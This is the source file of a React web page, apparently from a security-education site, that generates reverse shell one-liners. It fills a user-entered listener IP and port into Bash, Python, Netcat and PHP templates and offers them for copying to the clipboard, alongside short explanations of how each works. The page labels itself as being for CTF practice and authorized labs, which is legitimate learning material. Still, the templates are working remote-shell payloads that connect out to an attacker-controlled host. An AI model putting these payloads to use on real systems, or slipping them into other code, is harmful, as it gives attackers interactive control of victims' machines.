"use client";

import { useState, useEffect } from "react";
import { motion, AnimatePresence } from "framer-motion";
import {
    Terminal,
    Copy,
    Check,
    Info,
    AlertTriangle,
    ShieldAlert,
    Laptop,
    Server,
    ArrowRight
} from "lucide-react";
import Navbar from "@/components/Navbar";
import Footer from "@/components/Footer";

// Reverse Shell Templates and Explanations
const shellTypes = [
    {
        id: "bash",
        name: "Bash",
        template: "bash -i >& /dev/tcp/<IP>/<PORT> 0>&1",
        explanation: "Uses Bash's internal /dev/tcp device driver to create a TCP connection. The -i flag starts an interactive shell, and >& redirects stdout and stderr to the socket. 0>&1 redirects stdin from the socket.",
        useCase: "Commonly used in Linux environments where Bash is available and /dev/tcp support is enabled (standard in many distributions).",
        safetyNote: "Does not require external binaries like Netcat or Python."
    },
    {
        id: "python",
        name: "Python",
        template: "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"<IP>\",<PORT>));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(\"/bin/bash\")'",
        explanation: "Creates a TCP socket using the socket module, then uses os.dup2 to duplicate the socket's file descriptor to stdin (0), stdout (1), and stderr (2). pty.spawn starts a pseudo-terminal.",
        useCase: "Effective when Python is installed and higher control over the terminal (PTY) is needed for interactive commands.",
        safetyNote: "Provides a more robust shell than simple Bash redirection."
    },
    {
        id: "netcat",
        name: "Netcat",
        template: "nc -e /bin/bash <IP> <PORT>",
        explanation: "Uses the -e (execute) flag of Netcat to link the incoming connection directly to a shell process. Note: many modern versions of Netcat (like nc.openbsd) disable the -e flag for security.",
        useCase: "Classic tool for networking tasks. If -e is unavailable, 'Netcat Traditional' or pipes must be used.",
        safetyNote: "Often flagged by IDS/IPS and restricted in hardened environments."
    },
    {
        id: "php",
        name: "PHP",
        template: "php -r '$sock=fsockopen(\"<IP>\",<PORT>);exec(\"/bin/bash -i <&3 >&3 2>&3\");'",
        explanation: "Uses fsockopen to create a network connection, then exec to run a shell. The <&3 redirection assumes the socket is file descriptor 3, which is typical for the first opened resource.",
        useCase: "Useful when targeting web servers running PHP where shell access is possible through code execution.",
        safetyNote: "Requires the target to have the PHP CLI or allows system execution from a web server process."
    }
];

export default function RevShellPage() {
    const [shellType, setShellType] = useState(shellTypes[0]);
    const [ip, setIp] = useState("127.0.0.1");
    const [port, setPort] = useState("4444");
    const [copied, setCopied] = useState(false);

    const generatePayload = () => {
        const p = shellType.template
            .replace("<IP>", ip || "[IP_ADDRESS]")
            .replace("<PORT>", port || "[PORT]");

        return `# [!] PROTOCOL: ${shellType.name.toUpperCase()}_REVERSE_SHELL\n# [!] PURPOSE: EDUCATIONAL_REFERENCE_ONLY\n# [!] CONFIG: LHOST=${ip || "UNSET"}, LPORT=${port || "UNSET"}\n\n${p}`;
    };

    const handleCopy = () => {
        navigator.clipboard.writeText(generatePayload());
        setCopied(true);
        setTimeout(() => setCopied(false), 2000);
    };

    const sanitizeIp = (val: string) => {
        // Simple sanitization: allow only digits, dots, and common chars for local dev
        return val.replace(/[^0-9.]/g, "").slice(0, 15);
    };

    const sanitizePort = (val: string) => {
        return val.replace(/[^0-9]/g, "").slice(0, 5);
    };

    return (
        <main className="min-h-screen bg-cyber-black flex flex-col font-mono">
            <Navbar />

            <div className="flex-grow pt-32 pb-20 container mx-auto px-4">
                {/* Header Section */}
                <div className="mb-10 border-l-4 border-cyber-blue pl-6">
                    <motion.h1
                        initial={{ opacity: 0, x: -20 }}
                        animate={{ opacity: 1, x: 0 }}
                        className="text-2xl md:text-3xl font-bold text-white uppercase tracking-tighter"
                    >
                        {">"} REVSHELL_REFERENCE
                    </motion.h1>
                    <p className="text-gray-400 text-sm md:text-base mt-2 uppercase tracking-widest flex items-center">
                        <Terminal className="w-5 h-5 mr-3 text-cyber-blue" />
                        Educational listener-to-target redirection protocols
                    </p>
                </div>

                <div className="grid grid-cols-1 lg:grid-cols-12 gap-8">
                    {/* Controls & Inputs */}
                    <div className="lg:col-span-5 space-y-6">
                        <motion.div
                            initial={{ opacity: 0, y: 20 }}
                            animate={{ opacity: 1, y: 0 }}
                            className="bg-cyber-gray/20 border border-cyber-gray p-6 relative overflow-hidden group"
                        >
                            <div className="absolute top-0 right-0 w-16 h-1 bg-cyber-blue/50 group-hover:w-full transition-all duration-500"></div>

                            <h2 className="text-cyber-blue font-bold text-lg mb-6 flex items-center">
                                <Terminal className="w-5 h-5 mr-3" />
                                CONFIGURATION_SET
                            </h2>

                            <div className="space-y-4">
                                <div>
                                    <label className="block text-[10px] text-gray-500 uppercase tracking-widest mb-1.5">Shell Type</label>
                                    <select
                                        value={shellType.name}
                                        onChange={(e) => setShellType(shellTypes.find(s => s.name === e.target.value) || shellTypes[0])}
                                        className="w-full bg-black border border-cyber-gray text-white p-3 focus:border-cyber-blue outline-none transition-colors font-mono tracking-widest text-base"
                                    >
                                        {shellTypes.map(s => (
                                            <option key={s.id} value={s.name}>{s.name}</option>
                                        ))}
                                    </select>
                                </div>

                                <div className="grid grid-cols-2 gap-4">
                                    <div>
                                        <label className="block text-[10px] text-gray-500 uppercase tracking-widest mb-1.5">LHOST (Your IP)</label>
                                        <input
                                            type="text"
                                            value={ip}
                                            onChange={(e) => setIp(e.target.value)}
                                            placeholder="0.0.0.0"
                                            className="w-full bg-black border border-cyber-gray text-cyber-green p-3 focus:border-cyber-blue outline-none transition-colors font-mono text-base"
                                        />
                                    </div>
                                    <div>
                                        <label className="block text-[10px] text-gray-500 uppercase tracking-widest mb-1.5">LPORT</label>
                                        <input
                                            type="text"
                                            value={port}
                                            onChange={(e) => setPort(e.target.value)}
                                            placeholder="4444"
                                            className="w-full bg-black border border-cyber-gray text-cyber-green p-3 focus:border-cyber-blue outline-none transition-colors font-mono text-base"
                                        />
                                    </div>
                                </div>
                            </div>
                        </motion.div>

                        <motion.div
                            initial={{ opacity: 0, x: -20 }}
                            animate={{ opacity: 1, x: 0 }}
                            transition={{ delay: 0.2 }}
                            className="p-4 border border-cyber-pink/20 bg-cyber-pink/5 flex items-start space-x-4"
                        >
                            <ShieldAlert className="w-10 h-10 text-cyber-pink flex-shrink-0" />
                            <div>
                                <h3 className="text-cyber-pink font-bold text-xs uppercase mb-1">Warning: Education Only</h3>
                                <p className="text-[10px] text-gray-400 leading-relaxed">
                                    This tool is designed for Capture The Flag (CTF) preparation, authorized security labs, and educational research.
                                    Unauthorized access to computer systems is illegal and unethical.
                                </p>
                            </div>
                        </motion.div>
                    </div>

                    {/* Output & Content */}
                    <div className="lg:col-span-7 flex flex-col space-y-6">
                        {/* Output Section */}
                        <motion.div
                            initial={{ opacity: 0, scale: 0.98 }}
                            animate={{ opacity: 1, scale: 1 }}
                            className="bg-black border border-cyber-gray flex-grow relative flex flex-col"
                        >
                            <div className="p-3 border-b border-cyber-gray flex justify-between items-center bg-cyber-gray/10">
                                <div className="flex space-x-1.5">
                                    <div className="w-2.5 h-2.5 rounded-full bg-red-500/50"></div>
                                    <div className="w-2.5 h-2.5 rounded-full bg-yellow-500/50"></div>
                                    <div className="w-2.5 h-2.5 rounded-full bg-green-500/50"></div>
                                </div>
                                <span className="text-[9px] text-gray-500 uppercase tracking-widest">{shellType.id}.sh // TEMPLATE_STRUCTURE</span>
                            </div>

                            <div className="p-8 flex-grow">
                                <div className="p-5 bg-cyber-black/50 border border-cyber-gray/30 rounded font-mono text-base break-all leading-relaxed relative group whitespace-pre-wrap">
                                    <code className="text-cyber-green">
                                        {generatePayload()}
                                    </code>

                                    <button
                                        onClick={handleCopy}
                                        className="absolute top-2 right-2 p-2 bg-cyber-gray/30 hover:bg-cyber-blue/20 hover:text-cyber-blue transition-all rounded"
                                        title="Copy to clipboard"
                                    >
                                        {copied ? <Check className="w-4 h-4" /> : <Copy className="w-4 h-4" />}
                                    </button>
                                </div>
                                {copied && (
                                    <span className="text-[10px] text-cyber-blue mt-2 block animate-pulse">
                                        {">>"} COPIED_TO_CLIPBOARD
                                    </span>
                                )}
                            </div>

                            <div className="p-4 border-t border-cyber-gray text-center">
                                <p className="text-[9px] text-gray-600 uppercase">
                                    Note: This is a structured template. Ensure proper sanitization and context before use in lab environments.
                                </p>
                            </div>
                        </motion.div>

                        {/* Educational Layer */}
                        <AnimatePresence mode="wait">
                            <motion.div
                                key={shellType.id}
                                initial={{ opacity: 0, y: 10 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, y: -10 }}
                                className="grid grid-cols-1 md:grid-cols-2 gap-4"
                            >
                                <div className="p-5 border border-cyber-gray bg-cyber-gray/10">
                                    <div className="flex items-center text-cyber-blue mb-3">
                                        <Info className="w-4 h-4 mr-2" />
                                        <h4 className="text-xs font-bold uppercase tracking-widest">How it works</h4>
                                    </div>
                                    <p className="text-[11px] text-gray-400 leading-relaxed font-sans">
                                        {shellType.explanation}
                                    </p>
                                </div>
                                <div className="p-5 border border-cyber-gray bg-cyber-gray/10">
                                    <div className="flex items-center text-cyber-pink mb-3">
                                        <ArrowRight className="w-4 h-4 mr-2" />
                                        <h4 className="text-xs font-bold uppercase tracking-widest">Use Case & Context</h4>
                                    </div>
                                    <p className="text-[11px] text-gray-400 leading-relaxed font-sans">
                                        {shellType.useCase}
                                    </p>
                                    <div className="mt-4 pt-3 border-t border-cyber-gray/50 flex items-center text-[10px] text-gray-500 italic">
                                        <ShieldAlert className="w-3 h-3 mr-2 opacity-50" />
                                        {shellType.safetyNote}
                                    </div>
                                </div>
                            </motion.div>
                        </AnimatePresence>
                    </div>
                </div>

                {/* Footer Concepts */}
                <div className="mt-16 grid grid-cols-1 md:grid-cols-3 gap-6">
                    <div className="flex items-center space-x-4 p-4 border border-cyber-gray/30 opacity-60 hover:opacity-100 transition-opacity">
                        <Laptop className="w-8 h-8 text-cyber-blue" />
                        <div>
                            <h5 className="text-[10px] font-bold text-white uppercase">LHOST (Local Host)</h5>
                            <p className="text-[9px] text-gray-500">The IP of the machine waiting for the connection (the attacker's machine).</p>
                        </div>
                    </div>
                    <div className="flex items-center space-x-4 p-4 border border-cyber-gray/30 opacity-60 hover:opacity-100 transition-opacity">
                        <Server className="w-8 h-8 text-cyber-green" />
                        <div>
                            <h5 className="text-[10px] font-bold text-white uppercase">RHOST (Remote Host)</h5>
                            <p className="text-[9px] text-gray-500">The IP of the target machine initiating the contact.</p>
                        </div>
                    </div>
                    <div className="flex items-center space-x-4 p-4 border border-cyber-gray/30 opacity-60 hover:opacity-100 transition-opacity">
                        <AlertTriangle className="w-8 h-8 text-cyber-pink" />
                        <div>
                            <h5 className="text-[10px] font-bold text-white uppercase">Persistence</h5>
                            <p className="text-[9px] text-gray-500">Shells are usually transient. Understanding how they stay open is key to learning.</p>
                        </div>
                    </div>
                </div>
            </div>

            <Footer />
        </main>
    );
}
